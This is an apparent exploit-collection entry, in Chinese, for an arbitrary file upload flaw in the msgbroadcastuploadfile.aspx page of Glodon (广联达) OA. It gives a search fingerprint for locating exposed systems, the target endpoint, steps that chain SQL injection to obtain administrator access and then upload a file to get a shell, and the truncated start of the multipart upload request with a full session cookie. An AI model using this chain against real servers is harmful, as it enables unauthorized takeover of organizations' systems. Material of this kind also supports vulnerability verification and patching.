# 广联达OA后台msgbroadcastuploadfile.aspx任意文件上传漏洞

- **系统**：广联达OA后台msgbroadcastuploadfile.aspx　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1`

**请求体 / payload**
```
1. 通过SQL注入漏洞获取管理员信息登录后台
2. 通过上一步获取的`cookie`替换通过poc上传文件获取shell
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Cookie: 0_styleName=styleA; ASP.NET_SessionId=iujpmeeoodatd3valrfzlybx; GTP_IdServer_LangID=2052; .ASPXAUTH=C07DD2AB8669EC488CEC31D5290CD2329A8D4A672DC579B15BF250A1AB0C457E32E3B74C3C5339217DB1ABF71F302CE29B12E2988BE1EDA7BD39515525C0885A086FD123D50953E91BEBFDD88D731383DB986843A483119D9C66569100EE12DF7B7E0E242CC663A9B4663D176D9181EC8095DFC63F22386362387F521C179730; portal_default_menu_name_0=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86
------W…（脚本共 1377 字，完整版见原文）
```

**其他**
- 广联达OA后台msgbroadcastuploadfile.aspx任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 广联达办公OA